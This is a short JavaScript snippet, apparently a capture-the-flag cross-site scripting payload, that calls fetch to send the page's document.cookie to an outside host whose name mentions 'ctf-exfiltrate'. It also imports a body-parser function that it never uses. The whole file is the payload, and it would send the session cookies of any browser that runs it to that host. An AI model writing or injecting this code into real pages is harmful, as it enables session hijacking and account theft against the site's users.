const { json } = require("body-parser");

fetch(
  "https://ctf-exfiltrate-production.up.railway.app/?data=" +
    JSON.stringify(document.cookie)
);
